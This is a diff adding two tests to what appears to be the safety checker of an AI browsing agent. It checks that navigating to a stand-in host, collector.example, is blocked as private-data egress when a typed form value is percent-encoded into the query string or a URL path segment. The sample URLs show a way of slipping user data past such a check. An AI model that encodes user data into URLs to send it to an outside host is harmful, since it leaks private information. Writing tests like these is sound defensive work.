@@ -344,6 +344,60 @@ describe("Agent navigation actions", () => {
     })
   })
 
+  it("blocks a typed value the model percent-encoded into the URL", async () => {
+    const decision = await decide(
+      navigate(
+        "https://collector.example/?d=https%3A%2F%2Fa.example%2Fx%2520y-report"
+      ),
+      observation({
+        elements: [
+          {
+            ref: "e4",
+            frameId: 0,
+            tag: "input",
+            type: "text",
+            value: "https://a.example/x%20y-report",
+            visible: true,
+            enabled: true,
+            editable: true,
+            sensitive: false
+          }
+        ]
+      })
+    )
+    expect(decision).toEqual({
+      type: "blocked",
+      risk: "critical",
+      reason: "private_data_egress"
+    })
+  })
+
+  it("blocks a typed value the model encoded into a path segment", async () => {
+    const decision = await decide(
+      navigate("https://collector.example/account%20number%2055512345"),
+      observation({
+        elements: [
+          {
+            ref: "e4",
+            frameId: 0,
+            tag: "input",
+            type: "text",
+            value: "account number 55512345",
+            visible: true,
+            enabled: true,
+            editable: true,
+            sensitive: false
+          }
+        ]
+      })
+    )
+    expect(decision).toEqual({
+      type: "blocked",
+      risk: "critical",
+      reason: "private_data_egress"
+    })
+  })
+
   it("escalates page text the model padded inside a larger span", async () => {
     const decision = await decide(
       navigate(
